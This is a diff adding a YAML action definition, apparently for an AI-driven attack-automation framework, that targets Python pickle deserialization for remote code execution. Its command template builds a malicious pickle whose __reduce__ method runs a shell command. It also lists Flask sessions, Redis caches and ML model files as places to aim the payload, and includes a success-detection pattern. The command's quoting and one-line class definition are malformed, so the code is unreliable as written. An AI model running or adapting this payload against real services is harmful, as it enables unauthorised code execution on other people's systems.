@@ -1,0 +1,16 @@
+name: insecure_deserialization_python
+category: web
+description: Python pickle deserialization RCE
+preconditions:
+  - service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "python3 -c "import pickle,os; class P(object): def __reduce__(self): return (os.system, ('id',)); print(pickle.dumps(P()))""
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Python pickle: __reduce__ method executes arbitrary code on unpickle. Common in: Flask sessions (signed but predictable key), Redis-cached objects, ML model files."
